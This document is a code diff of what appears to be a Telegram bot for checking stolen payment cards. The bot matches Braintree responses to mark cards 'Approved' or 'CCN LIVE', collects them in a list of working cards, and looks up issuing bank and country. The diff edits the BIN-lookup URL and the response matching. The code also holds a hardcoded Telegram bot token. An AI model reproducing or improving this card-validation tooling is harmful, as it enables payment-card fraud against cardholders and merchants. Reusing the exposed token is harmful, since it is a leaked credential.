@@ -35,7 +35,7 @@ data = {'name': {'first': name, 'last': last},
                      'postcode': postal_code}}
 
 
-lookup_binlist_api_url = "https://bins.antipublic.cc/bins/"
+lookup_binlist_api_url = "https://lookup.binlist.net/"
 
 bot_token = "7595082838:AAFaftg-MDbjrMhSZQuC51y6S5H-Jmt3cno" #token
 bot = telebot.TeleBot(bot_token)
@@ -183,19 +183,18 @@ f"━━━━━━━━━━━━━━\n"
 f"\n"
 f"Devloper ↯ B3 ᴹ 🇮🇳\n")
                 msg_text = "non"
-            elif "insufficient" in response.text:
+            elif "ccn" in response.text:
                 workin_cards.append(card)
                 bot.send_message(chat_id=message.from_user.id,text=f"Braintree Auth\n"
 f"━━━━━━━━━━━━━━\n"
 f"Card ↯ {card}\n"
 f"Status ↯ Approved! ✅\n"
-f"Message ↯ Approved\n"
+f"Message ↯ CCN LIVE\n"
 f"━━━━━━━━━━━━━━\n"
 f"Bank ↯ {bank_name}\n"
 f"Brand ↯ {brand_name}\n"
 f"Country ↯ {country_name} {emoji}\n"
 f"━━━━━━━━━━━━━━\n"
-f"\n"
 f"Devloper ↯ B3 ᴹ 🇮🇳\n")
                 msg_text = "funds."
             elif "Your card s security code " in response.text:
